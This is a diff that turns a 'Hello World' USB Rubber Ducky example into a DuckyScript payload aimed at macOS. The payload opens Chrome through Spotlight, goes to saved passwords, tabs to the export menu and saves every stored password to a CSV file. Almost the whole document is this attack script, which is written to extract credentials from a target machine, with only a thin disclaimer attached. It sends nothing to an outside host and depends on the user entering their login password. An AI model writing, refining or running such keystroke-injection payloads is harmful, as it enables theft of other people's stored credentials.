@@ -1,6 +1,82 @@
-REM The next four lines open Notepad in Windows and type "Hello World!"
-GUI r
-STRING notepad
+REM Target: macOS - Attempt Chrome Password Export
+REM Author: vivek W
+REM Disclaimer: Use responsibly and legally. Cannot bypass macOS password prompts.
+REM Increase delays if the target system is slow.
+
+DELAY 3000     REM Wait for Ducky to initialize
+
+REM Open Spotlight
+COMMAND SPACE
+DELAY 500
+
+REM Type Chrome and open it
+STRING Google Chrome
+DELAY 500
 ENTER
-DELAY 250
-STRING Hello World!
+DELAY 7000     REM Wait for Chrome to potentially launch (increase if needed)
+
+REM Go to Chrome Settings (Preferences)
+COMMAND ,      REM Comma key for preferences
+DELAY 2500     REM Wait for settings tab to load
+
+REM Navigate to Password Settings - Search is usually reliable
+STRING Passwords
+DELAY 1000
+ENTER
+DELAY 3000     REM Wait for password section to load
+
+REM --- Highly Unreliable Part: Navigating to Export ---
+REM The number of TABs needed can change based on Chrome version, extensions, window size etc.
+REM This sequence attempts to TAB to the '...' menu next to Saved Passwords, open it, and select Export.
+REM You WILL likely need to adjust the number of TAB presses. Test carefully.
+
+REM Example: Try tabbing several times to reach the area near saved passwords
+REM Adjust the number of TABS below based on testing
+DELAY 1000
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB           REM Maybe this TAB lands on the '...' button?
+DELAY 500
+ENTER         REM Try pressing Enter to open the '...' menu
+DELAY 1000
+
+REM Assuming the menu opened, navigate down to 'Export passwords...'
+REM Often it's the first or second item after the menu opens.
+DOWNARROW     REM Try navigating down
+DELAY 500
+DOWNARROW     REM Try navigating down again just in case
+DELAY 500
+ENTER         REM Select Export Passwords
+DELAY 1500    REM Wait for the confirmation dialog
+
+REM Confirm the export action (clicks the "Export Passwords..." button on the warning)
+ENTER
+DELAY 2000    REM Wait for the macOS password prompt or save dialog
+
+REM --- macOS Security Prompt ---
+REM At this point, macOS WILL prompt for the user's login password to allow Chrome access.
+REM This script CANNOT enter the password. It relies on manual intervention or no password being set (very rare).
+REM We add a delay here, assuming the user might enter their password.
+DELAY 5000
+
+REM --- Save File Dialog ---
+REM If the password was entered, a Save dialog appears.
+REM Attempt to name the file and save it (usually defaults to Downloads or Desktop)
+STRING exported_chrome_passwords.csv
+DELAY 500
+ENTER         REM Press Enter to Save
+DELAY 2000
+
+REM --- Cleanup (Optional) ---
+REM Try to close Chrome
+REM COMMAND Q
+REM DELAY 1000
+REM ENTER         REM Confirm close if prompted (e.g., multiple tabs open warning)
+
+REM End of Script
